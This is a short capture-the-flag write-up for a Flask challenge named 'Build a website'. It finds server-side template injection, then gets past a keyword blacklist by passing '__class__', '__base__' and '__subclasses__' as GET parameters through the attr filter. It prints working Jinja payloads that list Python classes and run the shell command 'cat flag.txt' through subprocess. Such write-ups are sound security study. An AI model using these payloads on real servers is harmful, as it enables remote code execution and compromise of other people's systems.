## Build a website 

***I made a website where y'all can create your own websites! Should be considerably secure even though I'm a bit rusty with Flask.***

![](https://i.ibb.co/Q6GnQPr/build-a-website.png?size=150)

On the form we can enter some html which will be converted to webpage. My first thought was to inject some SSTI and I saw that {{ 7*7 }} results in 49 so the framework will be flask.
after some tries I recognized that on back-end there must be some blacklist on "globals, class" words which some confusing message (there is no stack smashing, it seems to be written by hand!!) 

```*** stack smashing detected ***: python3 terminated```


OK, my solution is: Send blacklist words as a GET params and prepare a statement ommiting blacklist
To avoid converting to strings we need to use ```attr``` function

```
to list all classes:
{{
''|attr(request.args.p1)|attr(request.args.p2)|attr(request.args.p3)()
}}
```

to send os commands:
```
{{
(''|attr(request.args.p1)|attr(request.args.p2)|attr(request.args.p3)())[360]('cat flag.txt',shell=True,stdout=-1).communicate()
}}
```
with params:
```
&p1=__class__&p2=__base__&p3=__subclasses__
```
